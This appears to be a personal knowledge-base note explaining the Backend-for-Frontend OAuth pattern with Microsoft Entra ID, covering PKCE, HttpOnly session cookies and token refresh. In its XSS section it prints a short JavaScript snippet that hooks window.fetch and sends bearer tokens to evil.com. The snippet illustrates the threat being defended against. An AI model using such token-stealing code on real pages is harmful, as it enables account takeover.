---
title: "BFF Pattern"
type: concept
created: 2026-04-11
updated: 2026-04-13
sources:
  - "[[Source---Entra-ID-App-Roles-BFF-JWT-Signing]]"
tags:
  - security
  - oauth
  - architecture
  - authentication
---

# BFF Pattern (Backend for Frontend)

An OAuth architecture where the **backend acts as the confidential OAuth client**, exchanges the auth code for tokens server-side, and issues an HttpOnly session cookie to the browser. The access token never reaches the browser.

Contrasted with [[OAuth-2.0-Authorization-Code-Flow#Pattern-1|Pattern 1 (Pure SPA)]] where [[MSAL]] exchanges the token in the browser.

## Why It Exists: The XSS Problem

In the pure SPA pattern, [[MSAL]] stores the access token in browser memory. An [[XSS]] attack can inject a script that monkey-patches `window.fetch`:

```javascript
const orig = window.fetch;
window.fetch = function(url, options) {
  if (options?.headers?.Authorization) {
    fetch('https://evil.com/steal?t=' + options.headers.Authorization);
  }
  return orig.apply(this, arguments);
};
```

This intercepts every outgoing API call and exfiltrates the Bearer token — even from memory, since the token must travel through `fetch` to reach the backend.

The BFF pattern eliminates this by ensuring the access token **never exists in the browser at all**. The browser only holds an opaque session cookie that JS cannot read.

## Full Traffic Path (Click to Cookie)

```
1.  User clicks "Login with Microsoft"
2.  JS generates code_verifier + code_challenge (PKCE)
    JS stores code_verifier in sessionStorage
3.  Browser redirects to Entra ID /authorize
      client_id, redirect_uri, scope, state, code_challenge
4.  Entra ID shows login page
5.  User logs in
6.  Entra ID redirects to redirect_uri:
      ?code=<auth-code>&state=<csrf-token>
7.  JS reads auth code from URL
    JS reads code_verifier from sessionStorage
    JS validates state (CSRF check)
8.  Frontend POSTs to backend:
      { code, code_verifier, state }
9.  Backend validates state
    Backend calls Entra ID /token:
      client_id + client_secret + code + code_verifier
10. Entra ID returns: access_token, id_token, refresh_token
11. Backend stores tokens in session store (Redis / DB / memory)
12. Backend responds:
      Set-Cookie: session_id=<opaque> HttpOnly Secure SameSite=Strict
13. Browser stores cookie (invisible to JS)
14. Every subsequent API call:
      Browser → Backend (cookie sent automatically)
      Backend → Session Store (look up access token)
      Backend → Downstream API (attach access token in header)
```

## The HttpOnly Cookie Security Property

`HttpOnly` flag makes the cookie **invisible to JavaScript entirely**. `document.cookie` does not show it. An XSS script cannot read it. The browser sends it automatically on every same-origin request, but no script can access its value.

```
Cookie flags used:
  HttpOnly   — invisible to JS
  Secure     — only sent over HTTPS
  SameSite=Strict — not sent on cross-site requests (CSRF protection)
```

## SPA Pattern vs BFF Pattern

| | Pattern 1 (SPA) | Pattern 2 (BFF) |
|---|---|---|
| Token exchange | MSAL in browser | Backend (confidential client) |
| client_secret used? | No | Yes |
| Token location | Browser memory | Server-side session store |
| Browser credential | Bearer token in header | HttpOnly session cookie |
| XSS risk | Token stealable via fetch monkey-patch | Cookie unreadable by JS |
| Complexity | Lower | Higher |
| MS docs guidance | Official SPA flow | BFF / confidential client flow |

> [!warning]
> Microsoft docs explicitly state: "Public clients, which include native applications and single page apps, must not use secrets or certificates when redeeming an authorization code." Pattern 1 is the sanctioned pure SPA flow. Pattern 2 requires the backend to act as a confidential client with its own [[App-Registration]].

## Subsequent Calls — Entra ID Off the Hot Path

After the initial authentication, **Entra ID is not involved in any normal API call**.

```
Every UI → Backend call:    Session cookie → local JWT check (no Entra ID)
Every ~1 hour (silently):   Backend → Entra ID (refresh token exchange)
On security events:         Entra ID → Backend (CAE revocation signal)
```

The full corrected ASCII for both phases:

```
                    AUTHENTICATION (once)

Browser          BFF Backend          Entra ID        Resource Server
   │                  │                   │                  │
   │──/authorize─────────────────────────►│                  │
   │                  │                   │ login UI         │
   │◄─────────────────────────────────────│                  │
   │──user credentials──────────────────►│                  │
   │◄─────────────────auth code──────────│                  │
   │──auth code──────►│                  │                  │
   │                  │──code+secret────►│                  │
   │                  │◄─access_token────│                  │
   │                  │  (scp, oid, azp) │                  │
   │                  │──store token (session store)         │
   │◄──HttpOnly cookie│                  │                  │

                    SUBSEQUENT CALLS (every request)

Browser          BFF Backend          Entra ID        Resource Server
   │                  │                   │                  │
   │──session cookie─►│                  │                  │
   │                  │ lookup token      │                  │
   │                  │ validate JWT locally (JWKS cached)   │
   │                  │──Bearer token───────────────────────►│
   │                  │                  │                  │ check scp/roles
   │◄─────────────────────────────────response──────────────│
```

Entra ID re-enters only for:
1. **Token expiry** (~1 hour): backend silently exchanges `refresh_token` for a new `access_token`. User doesn't notice.
2. **CAE (Continuous Access Evaluation)**: if account is disabled, password reset, or Conditional Access policy changes mid-session, Entra ID can push a revocation signal.

## Connections

- [[OAuth-2.0-Authorization-Code-Flow]] — the underlying flow both patterns implement
- [[PKCE]] — code_verifier is generated by frontend and forwarded to backend in Step 8
- [[App-Registration]] — backend uses its own client_id + client_secret in Step 9
- [[XSS]] — the primary attack the BFF pattern defends against
- [[JWT]] — access token stored server-side, never exposed to browser
- [[MSAL]] — handles Step 2-3 in both patterns; in BFF it does NOT do the token exchange
- [[JWKS]] — public keys cached by backend for local JWT validation on every request
- [[Source---Entra-ID-App-Roles-BFF-JWT-Signing]] — source session
- [[Source---Auth-Flows-Delegated-OID-Sub-Session]] — subsequent calls clarification and ASCII correction
